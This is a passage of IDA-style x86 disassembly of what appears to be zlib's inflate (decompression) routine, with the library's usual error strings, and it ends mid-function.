loc_402E61:				; CODE XREF: sub_402E20+39j
		mov	ecx, [edx+10h]
		mov	edx, [edx+4]
		push	ebx
		mov	ebx, [edi+38h]
		mov	[esp+34h+var_1C], eax
		mov	eax, [edi]
		push	esi
		mov	esi, [edi+3Ch]
		mov	[esp+38h+var_24], ecx
		mov	[esp+38h+var_28], edx
		mov	[esp+38h+var_4], edx
		mov	[esp+38h+var_18], ecx
		mov	[esp+38h+var_C], 0
		cmp	eax, 1Ch	; switch 29 cases
		jbe	short loc_402EA4

loc_402E92:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	eax, 0FFFFFFFEh	; jumptable 00402EA4 default case

loc_402E97:				; CODE XREF: sub_402E20+E4Aj
		pop	esi
		pop	ebx
		pop	edi
		pop	ebp
		add	esp, 28h
		retn
; ---------------------------------------------------------------------------
		align 10h

loc_402EA0:				; CODE XREF: sub_402E20+D3Ej
		mov	ecx, [esp+38h+var_24]

loc_402EA4:				; CODE XREF: sub_402E20+70j
		jmp	ds:off_403C88[eax*4] ; switch jump

loc_402EAB:				; DATA XREF: .text:off_403C88o
		cmp	dword ptr [edi+8], 0 ; jumptable 00402EA4 case 0
		jnz	short loc_402EBC
		mov	dword ptr [edi], 0Ch
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_402EBC:				; CODE XREF: sub_402E20+8Fj
		cmp	esi, 10h
		jnb	short loc_402EE1

loc_402EC1:				; CODE XREF: sub_402E20+BFj
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, 10h
		jb	short loc_402EC1

loc_402EE1:				; CODE XREF: sub_402E20+9Fj
		movzx	eax, bl
		shl	eax, 8
		mov	ecx, ebx
		shr	ecx, 8
		add	eax, ecx
		xor	edx, edx
		mov	ecx, 1Fh
		div	ecx
		test	edx, edx
		jz	short loc_402F0F
		mov	edx, [esp+38h+arg_0]
		mov	dword ptr [edx+18h], offset aIncorrectHeade ; "incorrect header	check"
		mov	edx, [esp+38h+var_28]
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_402F0F:				; CODE XREF: sub_402E20+D9j
		mov	eax, ebx
		and	al, 0Fh
		cmp	al, 8
		jz	short loc_402F2B
		mov	ecx, [esp+38h+arg_0]
		mov	edx, [esp+38h+var_28]
		mov	dword ptr [ecx+18h], offset aUnknownCompres ; "unknown compression method"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_402F2B:				; CODE XREF: sub_402E20+F5j
		shr	ebx, 4
		mov	ecx, ebx
		and	ecx, 0Fh
		add	ecx, 8
		sub	esi, 4
		cmp	ecx, [edi+24h]
		jbe	short loc_402F52
		mov	edx, [esp+38h+arg_0]
		mov	dword ptr [edx+18h], offset aInvalidWindowS ; "invalid window size"
		mov	edx, [esp+38h+var_28]
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_402F52:				; CODE XREF: sub_402E20+11Cj
		mov	eax, 1
		shl	eax, cl
		xor	edx, edx
		xor	ecx, ecx
		mov	[edi+14h], eax
		xor	eax, eax
		call	sub_402A30
		mov	ecx, [esp+38h+arg_0]
		mov	edx, [esp+38h+var_28]
		shr	ebx, 8
		not	ebx
		and	ebx, 2
		or	ebx, 9
		mov	[edi], ebx
		xor	ebx, ebx
		mov	[edi+18h], eax
		mov	[ecx+30h], eax
		xor	esi, esi
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_402F8B:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		cmp	esi, 20h	; jumptable 00402EA4 case 9
		jnb	short loc_402FB0

loc_402F90:				; CODE XREF: sub_402E20+18Ej
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, 20h
		jb	short loc_402F90

loc_402FB0:				; CODE XREF: sub_402E20+16Ej
		mov	ecx, ebx
		and	ecx, 0FF00h
		mov	eax, ebx
		shl	eax, 10h
		add	ecx, eax
		mov	eax, ebx
		shr	eax, 8
		shl	ecx, 8
		and	eax, 0FF00h
		add	ecx, eax
		shr	ebx, 18h
		lea	eax, [ecx+ebx]
		mov	ecx, [esp+38h+arg_0]
		xor	ebx, ebx
		mov	[edi+18h], eax
		mov	[ecx+30h], eax
		xor	esi, esi
		mov	dword ptr [edi], 0Ah

loc_402FE8:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		cmp	dword ptr [edi+0Ch], 0 ; jumptable 00402EA4 case 10
		jz	loc_403B71
		xor	eax, eax
		xor	edx, edx
		xor	ecx, ecx
		call	sub_402A30
		mov	edx, [esp+38h+arg_0]
		mov	[edx+30h], eax
		mov	edx, [esp+38h+var_28]
		mov	[edi+18h], eax
		mov	dword ptr [edi], 0Bh

loc_403011:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		cmp	dword ptr [edi+4], 0 ; jumptable 00402EA4 cases	11,12
		jz	short loc_40302B
		mov	ecx, esi
		and	ecx, 7
		shr	ebx, cl
		sub	esi, ecx
		mov	dword ptr [edi], 18h
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_40302B:				; CODE XREF: sub_402E20+1F5j
		cmp	esi, 3
		jnb	short loc_403050

loc_403030:				; CODE XREF: sub_402E20+22Ej
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, 3
		jb	short loc_403030

loc_403050:				; CODE XREF: sub_402E20+20Ej
		mov	ecx, ebx
		shr	ebx, 1
		mov	eax, ebx
		and	ecx, 1
		and	eax, 3
		dec	esi
		mov	[edi+4], ecx
		cmp	eax, 3		; switch 4 cases
		ja	short loc_4030B7 ; jumptable 00403065 default case
		jmp	ds:off_403CFC[eax*4] ; switch jump

loc_40306C:				; DATA XREF: .text:off_403CFCo
		shr	ebx, 2		; jumptable 00403065 case 0
		mov	dword ptr [edi], 0Dh
		sub	esi, 2
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_40307D:				; CODE XREF: sub_402E20+245j
					; DATA XREF: .text:off_403CFCo
		mov	eax, edi	; jumptable 00403065 case 1
		call	sub_402DA0
		shr	ebx, 2
		mov	dword ptr [edi], 12h
		sub	esi, 2
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_403095:				; CODE XREF: sub_402E20+245j
					; DATA XREF: .text:off_403CFCo
		shr	ebx, 2		; jumptable 00403065 case 2
		mov	dword ptr [edi], 0Fh
		sub	esi, 2
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_4030A6:				; CODE XREF: sub_402E20+245j
					; DATA XREF: .text:off_403CFCo
		mov	eax, [esp+38h+arg_0] ; jumptable 00403065 case 3
		mov	dword ptr [eax+18h], offset aInvalidBlockTy ; "invalid block type"
		mov	dword ptr [edi], 1Bh

loc_4030B7:				; CODE XREF: sub_402E20+243j
		shr	ebx, 2		; jumptable 00403065 default case
		sub	esi, 2
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_4030C2:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	ecx, esi	; jumptable 00402EA4 case 13
		and	ecx, 7
		sub	esi, ecx
		shr	ebx, cl
		cmp	esi, 20h
		jnb	short loc_4030F0

loc_4030D0:				; CODE XREF: sub_402E20+2CEj
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, 20h
		jb	short loc_4030D0

loc_4030F0:				; CODE XREF: sub_402E20+2AEj
		mov	ecx, ebx
		mov	eax, ebx
		not	ecx
		and	eax, 0FFFFh
		shr	ecx, 10h
		cmp	eax, ecx
		jz	short loc_403112
		mov	eax, [esp+38h+arg_0]
		mov	dword ptr [eax+18h], offset aInvalidStoredB ; "invalid stored block lengths"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_403112:				; CODE XREF: sub_402E20+2E0j
		xor	ebx, ebx
		mov	[edi+40h], eax
		xor	esi, esi
		mov	dword ptr [edi], 0Eh

loc_40311F:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	eax, [edi+40h]	; jumptable 00402EA4 case 14
		mov	[esp+38h+var_20], eax
		test	eax, eax
		jz	loc_403792
		cmp	eax, edx
		jbe	short loc_403138
		mov	eax, edx
		mov	[esp+38h+var_20], edx

loc_403138:				; CODE XREF: sub_402E20+310j
		mov	ecx, [esp+38h+var_24]
		cmp	eax, ecx
		jbe	short loc_403146
		mov	eax, ecx
		mov	[esp+38h+var_20], eax

loc_403146:				; CODE XREF: sub_402E20+31Ej
		test	eax, eax
		jz	loc_403BB7
		mov	edx, [esp+38h+var_20]
		mov	eax, [esp+38h+var_1C]
		mov	ecx, ebp
		call	sub_402570
		mov	eax, [esp+38h+var_20]
		sub	[esp+38h+var_28], eax
		sub	[esp+38h+var_24], eax
		add	[esp+38h+var_1C], eax
		mov	edx, [esp+38h+var_28]
		add	ebp, eax
		sub	[edi+40h], eax
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_40317B:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		cmp	esi, 0Eh	; jumptable 00402EA4 case 15
		jnb	short loc_4031A0

loc_403180:				; CODE XREF: sub_402E20+37Ej
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, 0Eh
		jb	short loc_403180

loc_4031A0:				; CODE XREF: sub_402E20+35Ej
		mov	ecx, ebx
		and	ecx, 1Fh
		shr	ebx, 5
		add	ecx, 101h
		mov	eax, ebx
		mov	[edi+60h], ecx
		shr	ebx, 5
		mov	ecx, ebx
		and	eax, 1Fh
		and	ecx, 0Fh
		inc	eax
		add	ecx, 4
		shr	ebx, 4
		sub	esi, 0Eh
		cmp	dword ptr [edi+60h], 11Eh
		mov	[edi+64h], eax
		mov	[edi+5Ch], ecx
		ja	loc_4032C6
		cmp	eax, 1Eh
		ja	loc_4032C6
		mov	dword ptr [edi+68h], 0
		mov	dword ptr [edi], 10h

loc_4031F1:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	ecx, [edi+68h]	; jumptable 00402EA4 case 16
		cmp	ecx, [edi+5Ch]
		jnb	short loc_40324B
		lea	esp, [esp+0]

loc_403200:				; CODE XREF: sub_402E20+429j
		cmp	esi, 3
		jnb	short loc_403225

loc_403205:				; CODE XREF: sub_402E20+403j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, 3
		jb	short loc_403205

loc_403225:				; CODE XREF: sub_402E20+3E3j
		mov	eax, [edi+68h]
		movzx	eax, ds:word_401E28[eax*2]
		mov	ecx, ebx
		and	ecx, 7
		mov	[edi+eax*2+70h], cx
		inc	dword ptr [edi+68h]
		mov	ecx, [edi+68h]
		shr	ebx, 3
		sub	esi, 3
		cmp	ecx, [edi+5Ch]
		jb	short loc_403200

loc_40324B:				; CODE XREF: sub_402E20+3D7j
		mov	eax, 13h
		cmp	[edi+68h], eax
		jnb	short loc_40327A
		jmp	short loc_403260
; ---------------------------------------------------------------------------
		align 10h

loc_403260:				; CODE XREF: sub_402E20+435j
					; sub_402E20+458j
		mov	edx, [edi+68h]
		movzx	ecx, ds:word_401E28[edx*2]
		xor	edx, edx
		mov	[edi+ecx*2+70h], dx
		inc	dword ptr [edi+68h]
		cmp	[edi+68h], eax
		jb	short loc_403260

loc_40327A:				; CODE XREF: sub_402E20+433j
		lea	eax, [edi+530h]
		lea	ecx, [edi+6Ch]
		mov	[ecx], eax
		mov	[edi+4Ch], eax
		lea	edx, [edi+2F0h]
		push	edx
		lea	eax, [edi+54h]
		push	eax
		push	ecx
		mov	dword ptr [eax], 7
		push	13h
		lea	eax, [edi+70h]
		push	eax
		push	0
		call	sub_402090
		mov	edx, [esp+50h+var_28]
		add	esp, 18h
		mov	[esp+38h+var_C], eax
		test	eax, eax
		jz	short loc_4032D6
		mov	ecx, [esp+38h+arg_0]
		mov	dword ptr [ecx+18h], offset aInvalidCodeLen ; "invalid code lengths set"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_4032C6:				; CODE XREF: sub_402E20+3B5j
					; sub_402E20+3BEj
		mov	eax, [esp+38h+arg_0]
		mov	dword ptr [eax+18h], offset aTooManyLengthO ; "too many	length or distance symbols"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_4032D6:				; CODE XREF: sub_402E20+494j
		mov	dword ptr [edi+68h], 0
		mov	dword ptr [edi], 11h

loc_4032E3:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	eax, [edi+64h]	; jumptable 00402EA4 case 17
		add	eax, [edi+60h]
		cmp	[edi+68h], eax
		jnb	loc_403506

loc_4032F2:				; CODE XREF: sub_402E20+6E0j
		mov	ecx, [edi+54h]
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [edi+4Ch]
		dec	eax
		and	eax, ebx
		mov	eax, [ecx+eax*4]
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		mov	[esp+38h+var_20], eax
		cmp	ecx, esi
		jbe	short loc_403353

loc_403315:				; CODE XREF: sub_402E20+531j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		mov	ecx, [edi+54h]
		dec	edx
		add	esi, 8
		add	ebx, eax
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [edi+4Ch]
		inc	ebp
		mov	[esp+38h+var_28], edx
		dec	eax
		and	eax, ebx
		mov	eax, [ecx+eax*4]
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		mov	[esp+38h+var_20], eax
		cmp	ecx, esi
		ja	short loc_403315

loc_403353:				; CODE XREF: sub_402E20+4F3j
		mov	ecx, eax
		shr	ecx, 10h
		cmp	ecx, 10h
		jnb	short loc_4033B2
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		cmp	esi, ecx
		jnb	short loc_403396
		lea	esp, [esp+0]

loc_403370:				; CODE XREF: sub_402E20+574j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	eax, [esp+38h+var_20]
		movzx	ecx, ah
		mov	[esp+38h+var_28], edx
		cmp	esi, ecx
		jb	short loc_403370

loc_403396:				; CODE XREF: sub_402E20+547j
		movzx	ecx, ah
		mov	eax, [edi+68h]
		shr	ebx, cl
		sub	esi, ecx
		mov	cx, word ptr [esp+38h+var_20+2]
		mov	[edi+eax*2+70h], cx
		inc	dword ptr [edi+68h]
		jmp	loc_4034F7
; ---------------------------------------------------------------------------

loc_4033B2:				; CODE XREF: sub_402E20+53Bj
		mov	cx, word ptr [esp+38h+var_20+2]
		cmp	cx, 10h
		jnz	short loc_403421
		movzx	ecx, ah
		lea	eax, [ecx+2]
		mov	[esp+38h+var_14], ecx
		cmp	esi, eax
		jnb	short loc_4033F6
		jmp	short loc_4033D0
; ---------------------------------------------------------------------------
		align 10h

loc_4033D0:				; CODE XREF: sub_402E20+5ABj
					; sub_402E20+5D4j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		mov	ecx, [esp+38h+var_14]
		dec	edx
		add	esi, 8
		add	ebx, eax
		lea	eax, [ecx+2]
		inc	ebp
		mov	[esp+38h+var_28], edx
		cmp	esi, eax
		jb	short loc_4033D0

loc_4033F6:				; CODE XREF: sub_402E20+5A9j
		mov	eax, [edi+68h]
		shr	ebx, cl
		sub	esi, ecx
		test	eax, eax
		jz	loc_40355D
		movzx	ecx, word ptr [edi+eax*2+6Eh]
		mov	eax, ebx
		and	eax, 3
		add	eax, 3
		shr	ebx, 2
		mov	[esp+38h+var_10], ecx
		sub	esi, 2
		jmp	loc_4034C8
; ---------------------------------------------------------------------------

loc_403421:				; CODE XREF: sub_402E20+59Bj
		movzx	eax, ah
		mov	[esp+38h+var_14], eax
		cmp	cx, 11h
		jnz	short loc_403473
		add	eax, 3
		cmp	esi, eax
		jnb	short loc_40345B

loc_403435:				; CODE XREF: sub_402E20+639j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	eax, [esp+38h+var_14]
		add	eax, 3
		mov	[esp+38h+var_28], edx
		cmp	esi, eax
		jb	short loc_403435

loc_40345B:				; CODE XREF: sub_402E20+613j
		mov	ecx, [esp+38h+var_14]
		shr	ebx, cl
		mov	edx, 0FFFFFFFDh
		mov	eax, ebx
		and	eax, 7
		add	eax, 3
		shr	ebx, 3
		jmp	short loc_4034BC
; ---------------------------------------------------------------------------

loc_403473:				; CODE XREF: sub_402E20+60Cj
		add	eax, 7
		cmp	esi, eax
		jnb	short loc_4034A6
		lea	ebx, [ebx+0]

loc_403480:				; CODE XREF: sub_402E20+684j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	eax, [esp+38h+var_14]
		add	eax, 7
		mov	[esp+38h+var_28], edx
		cmp	esi, eax
		jb	short loc_403480

loc_4034A6:				; CODE XREF: sub_402E20+658j
		mov	ecx, [esp+38h+var_14]
		shr	ebx, cl
		mov	edx, 0FFFFFFF9h
		mov	eax, ebx
		and	eax, 7Fh
		add	eax, 0Bh
		shr	ebx, 7

loc_4034BC:				; CODE XREF: sub_402E20+651j
		sub	edx, ecx
		add	esi, edx
		mov	[esp+38h+var_10], 0

loc_4034C8:				; CODE XREF: sub_402E20+5FCj
		mov	edx, [edi+64h]
		mov	ecx, [edi+68h]
		add	edx, [edi+60h]
		add	ecx, eax
		cmp	ecx, edx
		ja	loc_40356D
		test	eax, eax
		jz	short loc_4034F3
		mov	ecx, [esp+38h+var_10]

loc_4034E3:				; CODE XREF: sub_402E20+6D1j
		mov	edx, [edi+68h]
		dec	eax
		mov	[edi+edx*2+70h], cx
		inc	dword ptr [edi+68h]
		test	eax, eax
		jnz	short loc_4034E3

loc_4034F3:				; CODE XREF: sub_402E20+6BDj
		mov	edx, [esp+38h+var_28]

loc_4034F7:				; CODE XREF: sub_402E20+58Dj
		mov	eax, [edi+64h]
		add	eax, [edi+60h]
		cmp	[edi+68h], eax
		jb	loc_4032F2

loc_403506:				; CODE XREF: sub_402E20+4CCj
		cmp	dword ptr [edi], 1Bh
		jz	loc_403B59
		lea	eax, [edi+530h]
		lea	ecx, [edi+6Ch]
		mov	[ecx], eax
		mov	[edi+4Ch], eax
		lea	edx, [edi+2F0h]
		push	edx
		lea	eax, [edi+54h]
		push	eax
		push	ecx
		mov	dword ptr [eax], 9
		mov	eax, [edi+60h]
		push	eax
		lea	ecx, [edi+70h]
		push	ecx
		push	1
		call	sub_402090
		add	esp, 18h
		mov	[esp+38h+var_C], eax
		test	eax, eax
		jz	short loc_403581
		mov	edx, [esp+38h+arg_0]
		mov	dword ptr [edx+18h], offset aInvalidLiteral ; "invalid literal/lengths set"
		mov	edx, [esp+38h+var_28]
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_40355D:				; CODE XREF: sub_402E20+5DFj
		mov	ecx, [esp+38h+arg_0]
		mov	dword ptr [ecx+18h], offset aInvalidBitLeng ; "invalid bit length repeat"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_40356D:				; CODE XREF: sub_402E20+6B5j
		mov	edx, [esp+38h+arg_0]
		mov	dword ptr [edx+18h], offset aInvalidBitLeng ; "invalid bit length repeat"
		mov	edx, [esp+38h+var_28]
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_403581:				; CODE XREF: sub_402E20+727j
		mov	eax, [edi+6Ch]
		lea	ecx, [edi+6Ch]
		mov	[edi+50h], eax
		lea	edx, [edi+2F0h]
		push	edx
		mov	edx, [edi+60h]
		lea	eax, [edi+58h]
		push	eax
		push	ecx
		mov	ecx, [edi+64h]
		mov	dword ptr [eax], 6
		push	ecx
		lea	eax, [edi+edx*2+70h]
		push	eax
		push	2
		call	sub_402090
		mov	edx, [esp+50h+var_28]
		add	esp, 18h
		mov	[esp+38h+var_C], eax
		test	eax, eax
		jz	short loc_4035CE
		mov	ecx, [esp+38h+arg_0]
		mov	dword ptr [ecx+18h], offset aInvalidDistanc ; "invalid distances set"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_4035CE:				; CODE XREF: sub_402E20+79Cj
		mov	dword ptr [edi], 12h

loc_4035D4:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		cmp	edx, 6		; jumptable 00402EA4 case 18
		jb	short loc_403638
		cmp	[esp+38h+var_24], 102h
		jb	short loc_403638
		mov	eax, [esp+38h+arg_0]
		mov	ecx, [esp+38h+var_24]
		mov	edx, [esp+38h+var_1C]
		mov	[eax+10h], ecx
		mov	ecx, [esp+38h+var_18]
		mov	[eax+0Ch], edx
		mov	edx, [esp+38h+var_28]
		push	ecx
		push	eax
		mov	[eax], ebp
		mov	[eax+4], edx
		mov	[edi+38h], ebx
		mov	[edi+3Ch], esi
		call	sub_4025D0
		mov	eax, [esp+40h+arg_0]
		mov	edx, [eax+0Ch]
		mov	ecx, [eax+10h]
		mov	ebp, [eax]
		mov	ebx, [edi+38h]
		mov	esi, [edi+3Ch]
		mov	[esp+40h+var_1C], edx
		mov	edx, [eax+4]
		add	esp, 8
		mov	[esp+38h+var_24], ecx
		mov	[esp+38h+var_28], edx
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_403638:				; CODE XREF: sub_402E20+7B7j
					; sub_402E20+7C1j
		mov	ecx, [edi+54h]
		mov	eax, 1
		shl	eax, cl
		dec	eax
		and	eax, ebx
		mov	ecx, eax
		mov	eax, [edi+4Ch]
		mov	eax, [eax+ecx*4]
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		mov	[esp+38h+var_20], eax
		cmp	ecx, esi
		jbe	short loc_40369E
		lea	ecx, [ecx+0]

loc_403660:				; CODE XREF: sub_402E20+87Cj
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		mov	ecx, [edi+54h]
		dec	edx
		add	esi, 8
		add	ebx, eax
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [edi+4Ch]
		inc	ebp
		mov	[esp+38h+var_28], edx
		dec	eax
		and	eax, ebx
		mov	eax, [ecx+eax*4]
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		mov	[esp+38h+var_20], eax
		cmp	ecx, esi
		ja	short loc_403660

loc_40369E:				; CODE XREF: sub_402E20+83Bj
		test	al, al
		jz	loc_403767
		test	al, 0F0h
		jnz	loc_403767
		mov	ecx, eax
		shr	ecx, 8
		mov	[esp+38h+var_8], ecx
		movzx	ecx, cl
		mov	[esp+38h+var_14], ecx
		movzx	ecx, al
		add	ecx, [esp+38h+var_14]
		mov	[esp+38h+var_10], eax
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [esp+38h+var_14]
		dec	eax
		and	eax, ebx
		shr	eax, cl
		mov	ecx, [esp+38h+var_20]
		shr	ecx, 10h
		add	eax, ecx
		mov	ecx, eax
		mov	eax, [edi+4Ch]
		mov	eax, [eax+ecx*4]
		movzx	ecx, byte ptr [esp+38h+var_8]
		mov	[esp+38h+var_20], eax
		shr	eax, 8
		movzx	eax, al
		add	eax, ecx
		cmp	eax, esi
		jbe	short loc_40375A
		nop

loc_403700:				; CODE XREF: sub_402E20+938j
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		mov	ecx, [esp+38h+var_10]
		dec	edx
		add	esi, 8
		add	ebx, eax
		movzx	eax, ch
		mov	[esp+38h+var_14], eax
		movzx	ecx, cl
		add	ecx, eax
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [esp+38h+var_14]
		inc	ebp
		mov	[esp+38h+var_28], edx
		dec	eax
		and	eax, ebx
		shr	eax, cl
		movzx	ecx, word ptr [esp+38h+var_10+2]
		add	eax, ecx
		mov	ecx, [edi+4Ch]
		mov	eax, [ecx+eax*4]
		mov	[esp+38h+var_20], eax
		shr	eax, 8
		movzx	eax, al
		add	eax, [esp+38h+var_14]
		cmp	eax, esi
		ja	short loc_403700

loc_40375A:				; CODE XREF: sub_402E20+8DDj
		movzx	ecx, byte ptr [esp+38h+var_10+1]
		mov	eax, [esp+38h+var_20]
		shr	ebx, cl
		sub	esi, ecx

loc_403767:				; CODE XREF: sub_402E20+880j
					; sub_402E20+888j
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		shr	ebx, cl
		sub	esi, ecx
		mov	[esp+38h+var_14], ecx
		mov	ecx, eax
		shr	ecx, 10h
		mov	[edi+40h], ecx
		test	al, al
		jnz	short loc_40378E
		mov	dword ptr [edi], 17h
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_40378E:				; CODE XREF: sub_402E20+961j
		test	al, 20h
		jz	short loc_40379D

loc_403792:				; CODE XREF: sub_402E20+308j
		mov	dword ptr [edi], 0Bh
		jmp	loc_403B59
; ---------------------------------------------------------------------------

loc_40379D:				; CODE XREF: sub_402E20+970j
		test	al, 40h
		jz	short loc_4037B1
		mov	eax, [esp+38h+arg_0]
		mov	dword ptr [eax+18h], offset aInvalidLiter_0 ; "invalid literal/length code"
		jmp	loc_403B53
; ---------------------------------------------------------------------------

loc_4037B1:				; CODE XREF: sub_402E20+97Fj
		movzx	ecx, al
		and	ecx, 0Fh
		mov	[edi+48h], ecx
		mov	dword ptr [edi], 13h

loc_4037C0:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	eax, [edi+48h]	; jumptable 00402EA4 case 19
		test	eax, eax
		jz	short loc_403804
		cmp	esi, eax
		jnb	short loc_4037F0
		jmp	short loc_4037D0
; ---------------------------------------------------------------------------
		align 10h

loc_4037D0:				; CODE XREF: sub_402E20+9ABj
					; sub_402E20+9CEj
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		dec	edx
		add	esi, 8
		inc	ebp
		add	ebx, eax
		mov	[esp+38h+var_28], edx
		cmp	esi, [edi+48h]
		jb	short loc_4037D0

loc_4037F0:				; CODE XREF: sub_402E20+9A9j
		mov	ecx, [edi+48h]
		mov	eax, 1
		shl	eax, cl
		dec	eax
		and	eax, ebx
		add	[edi+40h], eax
		shr	ebx, cl
		sub	esi, ecx

loc_403804:				; CODE XREF: sub_402E20+9A5j
		mov	dword ptr [edi], 14h

loc_40380A:				; CODE XREF: sub_402E20:loc_402EA4j
					; DATA XREF: .text:off_403C88o
		mov	ecx, [edi+58h]	; jumptable 00402EA4 case 20
		mov	eax, 1
		shl	eax, cl
		dec	eax
		and	eax, ebx
		mov	ecx, eax
		mov	eax, [edi+50h]
		mov	eax, [eax+ecx*4]
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		mov	[esp+38h+var_20], eax
		cmp	ecx, esi
		jbe	short loc_40386E
		nop

loc_403830:				; CODE XREF: sub_402E20+A4Cj
		test	edx, edx
		jz	loc_403BB7
		movzx	eax, byte ptr [ebp+0]
		mov	ecx, esi
		shl	eax, cl
		mov	ecx, [edi+58h]
		dec	edx
		add	esi, 8
		add	ebx, eax
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [edi+50h]
		inc	ebp
		mov	[esp+38h+var_28], edx
		dec	eax
		and	eax, ebx
		mov	eax, [ecx+eax*4]
		mov	ecx, eax
		shr	ecx, 8
		movzx	ecx, cl
		mov	[esp+38h+var_20], eax
		cmp	ecx, esi
		ja	short loc_403830

loc_40386E:				; CODE XREF: sub_402E20+A0Dj
		test	al, 0F0h
		jnz	loc_40392E
		mov	ecx, eax
		shr	ecx, 8
		mov	[esp+38h+var_8], ecx
		movzx	ecx, cl
		mov	[esp+38h+var_14], ecx
		movzx	ecx, al
		add	ecx, [esp+38h+var_14]
		mov	[esp+38h+var_10], eax
		mov	eax, 1
		shl	eax, cl
		mov	ecx, [esp+38h+var_14]
		dec	eax
		and	eax, ebx
		shr	eax, cl
		mov	ecx, [esp+38h+var_20]
		shr	ecx, 10h
		add	eax, ecx
		mov	ecx, eax
		mov	eax, [edi+50h]
		mov	eax, [eax+ecx*4]
		movzx	ecx, byte ptr [esp+38h+var_8]
		mov	[esp+38h+var_20], eax
		shr	eax, 8
		movzx	eax, al
		add	eax, ecx
		cmp	eax, esi
		jbe	short loc_403921

loc_4038C7:				; CODE XREF: sub_402E20+AFFj
